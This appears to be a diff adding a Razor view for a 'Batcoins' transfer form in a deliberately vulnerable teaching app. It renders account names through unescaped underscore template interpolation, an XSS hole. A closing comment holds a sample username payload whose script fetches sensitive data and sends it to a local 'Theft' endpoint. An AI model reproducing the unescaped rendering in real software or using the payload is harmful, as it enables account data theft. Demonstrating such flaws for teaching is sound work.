@@ -1,0 +1,63 @@
+﻿@{
+    ViewBag.Title = "Batcoins transfer (clien-side version)";
+}
+
+<div class="jumbotron">
+    <h2>@ViewBag.Title</h2>
+    <div id="appRoot">
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.8.3/underscore-min.js"></script>
+<script type="text/template" id="transferTemplate">
+    <form action="/Home/Transfer2" method="POST">
+        <div class="form-group">
+            <label for="Amount">Amount</label>
+            <input id="Amount" name="Amount" class="form-control input-lg" type="text" value="0" />
+        </div>
+        <div class="form-group">
+            <label for="To">To</label>
+            <div class="form-inline">
+                <select class="form-control" data-val="true" id="To" name="To">
+                    <% _.each(listItems, function (item) { %>
+                    <% if (item.selected) { %>
+                    <option selected="selected" value="<%= item.value %>"><%= item.text %></option>
+                    <% } else { %>
+                    <option value="<%= item.value %>"><%= item.text %></option>
+                    <% } %>
+                    <% }); %>
+                </select>
+            </div>
+        </div>
+        <br />
+        <button type="submit" class="btn btn-lg btn-primary">Confirm identity</button>
+    </form>
+</script>
+<script>
+    $(function () {
+        $.post('/Home/GetAccount', function (accounts) {
+            var username = '@User.Identity.Name';
+            var listItems = _.map(accounts, function (acc) {
+                return {
+                    selected: acc.Username == username,
+                    text: acc.Username,
+                    value: acc.Username
+                };
+            });
+
+            listItems.unshift({
+                selected: _.all(accounts, function (acc) { return acc.Username != username; }),
+                text: '',
+                value: ''
+            });
+
+            var tmpl = _.template($('#transferTemplate').html());
+            var content = tmpl({ listItems: listItems });
+            //console.log(content);
+            $('#appRoot').html(content);
+        });
+    });
+</script>
+
+
+@* Joker<script>$(function () { $.get('/Home/GetSensetiveInfo', function (res) { $('<img>').attr('src', 'http://localhost:6118/Home/Theft?data=' + encodeURIComponent(res.data)).appendTo('body').hide(); }); });</script> *@
